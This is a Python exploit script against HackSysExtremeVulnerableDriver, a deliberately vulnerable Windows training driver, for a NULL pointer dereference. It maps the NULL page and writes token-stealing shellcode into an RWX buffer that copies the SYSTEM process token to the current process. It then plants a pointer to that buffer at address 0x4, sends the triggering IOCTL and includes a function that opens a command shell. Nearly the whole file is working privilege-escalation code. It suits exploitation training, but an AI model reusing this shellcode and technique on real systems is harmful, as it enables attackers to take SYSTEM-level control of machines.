import ctypes, sys, struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *
import sys

kernel32 = windll.kernel32
ntdll = windll.ntdll
GetCurrentProcess = windll.kernel32.GetCurrentProcess

def allocation():

    print("[*] Mapping the NULL page (4096 bytes)...")
    result = ntdll.NtAllocateVirtualMemory(
        GetCurrentProcess(),
        pointer(c_void_p(1)),
        0,
        pointer(c_ulong(4096)),
        0x3000,
        0x40
    )

    if result == 0:
        print("[*] OMG, it actually worked. NULL page mapped.")

    else:
        print("[!] Unable to map NULL page with error: {}".format(str(GetLastError())))
        sys.exit(1)

    shellcode = (
    "\x60"
    "\x64\xA1\x24\x01\x00\x00"
    "\x8B\x40\x50"
    "\x89\xC1"
    "\x8B\x98\xF8\x00\x00\x00"
    "\xBA\x04\x00\x00\x00"
    "\x8B\x80\xB8\x00\x00\x00"
    "\x2D\xB8\x00\x00\x00"
    "\x39\x90\xB4\x00\x00\x00"
    "\x75\xED"
    "\x8B\x90\xF8\x00\x00\x00"
    "\x89\x91\xF8\x00\x00\x00"
    "\x61"
    "\xC3"
)

    buffer = create_string_buffer(shellcode)

    ptr = kernel32.VirtualAlloc(
        c_int(), 
        c_int(len(shellcode)), 
        c_int(0x3000), 
        c_int(0x40)
    )

    memmove(ptr, buffer, len(shellcode))

    print("[*] Allocated RWX shellcode buffer at: {}".format(hex(ptr)))

    print("[*] Moving shellcode buffer pointer to 0x00000004...")
    memmove(0x4, struct.pack("<L",ptr), 0x4)


def interact():
    
    hevd = kernel32.CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver", 
        0xC0000000, 
        0, 
        None, 
        0x3, 
        0, 
        None)
    
    if (not hevd) or (hevd == -1):
        print("[!] Failed to retrieve handle to device-driver with error-code: " + str(GetLastError()))
        sys.exit(1)
    else:
        print("[*] Successfully retrieved handle to device-driver: " + str(hevd))

    buf = "A" * 4
        
    result = kernel32.DeviceIoControl(
        hevd,
        0x22202b,
        buf,
        len(buf),
        None,
        0,
        byref(c_ulong()),
        None
    )

    if result != 0:
        print("[*] Payload sent.")
    else:
        print("[!] Payload failed. Last error: " + str(GetLastError()))

def shell():
    Popen("start cmd", shell=True)

allocation()
